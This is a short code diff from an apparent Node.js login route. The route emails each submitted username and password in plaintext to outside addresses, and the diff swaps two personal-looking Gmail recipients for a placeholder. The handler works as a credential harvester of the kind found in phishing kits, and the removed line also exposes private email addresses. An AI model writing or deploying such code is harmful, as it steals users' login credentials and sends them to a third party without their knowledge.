@@ -38,7 +38,7 @@ app.post('/login',function(req,res)
 {
   sendmail({
     from: 'no-reply@yourdomain.com',
-    to: 'jeffahking@gmail.com, sarahm.aoun@gmail.com ',
+    to: 'fake@example.com',
     subject: 'test sendmail',
     html: "username:" + req.body['username'] + " || password: "+ req.body['password'],
   }, function(err, reply) {
